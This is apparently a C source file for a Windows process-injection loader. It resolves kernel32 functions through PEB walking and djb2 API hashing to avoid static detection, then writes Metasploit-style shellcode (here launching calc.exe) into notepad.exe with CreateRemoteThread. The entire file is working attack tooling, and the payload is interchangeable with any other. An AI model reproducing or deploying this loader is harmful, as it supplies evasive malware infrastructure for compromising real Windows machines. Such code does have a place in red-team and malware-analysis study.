
#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>


#include "Structs.h"

#ifndef STRUCTS
#include <winternl.h>
#endif // !STRUCTS

// https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-containing_record
#define CONTAINING_RECORD(address, type, field) \
    ((type *)((PCHAR)(address) - (ULONG_PTR)(&((type *)0)->field)))


#define openprochash 1899429334
#define virtualallochash 4084095668
#define writeprochash 1864558792
#define createthreadhash 2855303005

#define kernel32hash 1883303541


DWORD GetProcessIdByName(LPCTSTR name)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	DWORD pid = 0;
	PROCESSENTRY32 pe = { 0 };

	if (hSnapshot != INVALID_HANDLE_VALUE) {
		pe.dwSize = sizeof(PROCESSENTRY32);



		CharLowerBuff(pe.szExeFile, lstrlen(pe.szExeFile));


		if (Process32First(hSnapshot, &pe))

		{
			do
			{
				if (lstrcmpi(pe.szExeFile, name) == 0)
				{
					pid = pe.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnapshot, &pe));
		}
		CloseHandle(hSnapshot);
		return pid;


	}
}





DWORD HashStringDjb2A(_In_ LPCSTR String)
{
	ULONG Hash = 5381;
	INT c = 0;

	while (c = *String++)
		Hash = ((Hash << 5) + Hash) + c;

	return Hash;
}

DWORD HashStringDjb2W(_In_ LPCWSTR String)
{
	ULONG Hash = 5381;
	INT c = 0;

	while (c = *String++)
	{
		c = towlower(c); // convert to lowercase
		Hash = ((Hash << 5) + Hash) + c;
	}

	return Hash;
}


HMODULE GetHandle(IN DWORD Dllhash) {
	PPEB Peb = (PPEB*)(__readgsqword(0x60));  // PEB is at offset 0x60 from GS

	PPEB_LDR_DATA Ldr = Peb->Ldr; // Ldr is at offset 0x18 from PEB

	LDR_DATA_TABLE_ENTRY* Entry = (LDR_DATA_TABLE_ENTRY*)Ldr->InLoadOrderModuleList.Flink; // InLoadOrderModuleList is at offset 0x10 from Ldr

	while (Entry->DllBase != NULL) {
		DWORD currentHash = HashStringDjb2W(Entry->BaseDllName.Buffer);
		if (Dllhash == currentHash) {
			//print the hash of the dll we just found

			return Entry->DllBase;
		}
		Entry = (LDR_DATA_TABLE_ENTRY*)Entry->InLoadOrderLinks.Flink;
	}
	return NULL;
}




FARPROC GetProcAdd(IN HMODULE hBase, IN LPCSTR lpApHash) {
	//Avoid casting
	PBYTE pPE = (PBYTE)hBase;

	//Get the Dos header
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pPE;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		return -1;
	}

	//Get the  
	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pPE + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
		return -1;
	}
	//Get the optnal OptionalHeader
	IMAGE_OPTIONAL_HEADER	ImgOptHdr = pImgNtHdrs->OptionalHeader;
	if (ImgOptHdr.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) {
		return -1;
	}

	//Getting the IMAGE_EXPORT_DIRECTORY 
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pPE + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// Getting the function's names array pointer
	PDWORD FunctionNameArray = (PDWORD)(pPE + pImgExportDir->AddressOfNames);

	// Getting the function's addresses array pointer
	PDWORD FunctionAddressArray = (PDWORD)(pPE + pImgExportDir->AddressOfFunctions);

	// Getting the function's ordinal array pointer
	PWORD  FunctionOrdinalArray = (PWORD)(pPE + pImgExportDir->AddressOfNameOrdinals);

	//Looping through all the funtions 
	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
		//Getting the fun name
		char* FunName = (char*)(pPE + FunctionNameArray[i]);
		//Get the hash of the function name
		DWORD FunHash = HashStringDjb2A(FunName);

		//Check if the hash is the same as the one passed

		if (FunHash == lpApHash) {
			//Get the function's address
			//print the two hashes founbd
			printf("Hash of the function name: %d\n", FunHash);
			printf("Hash of the function name: %d\n", lpApHash);
			getchar();
			DWORD FunAddress = FunctionAddressArray[FunctionOrdinalArray[i]];
			return (FARPROC)(pPE + FunAddress);
		}


	}
	return -1;

}


int main() {
	char calcshell[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";



	DWORD pid = GetProcessIdByName(L"notepad.exe");

	LoadLibraryA("Kernel32.dll"); 

	//Get the handle of the kernel32.dll
	HMODULE hKernel32 = GetHandle(kernel32hash);
	if (hKernel32 == NULL) {
			printf("Kernel32.dll not found\n");
			return -1;
		}

	//Get the address of OpenProcess
	FARPROC pLoadLibraryA = GetProcAdd(hKernel32, openprochash);
	if (pLoadLibraryA == -1) {
			printf("OpenProc not found\n");
			return -1;
		}

	//Get the address of VirtualAlloc
	FARPROC pVirtualAlloc = GetProcAdd(hKernel32, virtualallochash);
	if (pVirtualAlloc == -1) {
				printf("VirtualAlloc not found\n");
				return -1;
			}

	//Get the address of WriteProcessMemory
	FARPROC pWriteProcessMemory = GetProcAdd(hKernel32, writeprochash);
	if (pWriteProcessMemory == -1) {
					printf("WriteProcessMemory not found\n");
					return -1;
				}

	//Get the address of CreateRemoteThread
	FARPROC pCreateRemoteThread = GetProcAdd(hKernel32, createthreadhash);
	if (pCreateRemoteThread == -1) {
							printf("CreateRemoteThread not found\n");
							return -1;
						}

	//Open the process
	HANDLE hProcess = ((HANDLE(*)(DWORD, BOOL, DWORD))pLoadLibraryA)(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) {
			printf("Process not opened\n");
			return -1;
		}

	//Allocate memory in the remote process
	LPVOID pRemoteMemory = ((LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))pVirtualAlloc)(hProcess, NULL, sizeof(calcshell), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);	\
	if (pRemoteMemory == NULL) {
			printf("Memory not allocated\n");
			return -1;
		}

	//Write the shellcode to the remote process
	BOOL bWrite = ((BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))pWriteProcessMemory)(hProcess, pRemoteMemory, calcshell, sizeof(calcshell), NULL);
	if(bWrite == FALSE) {
		printf("Memory not written\n");
		return -1;
	}

	Sleep(5000);

	//Create a remote thread
	HANDLE hThread = ((HANDLE(*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))pCreateRemoteThread)(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteMemory, NULL, 0, NULL);
	if (hThread == NULL) {
			printf("Thread not created\n");
			return -1;
		}

	Sleep(5000);

	//Close the handle
	CloseHandle(hProcess);
	return 0;
}
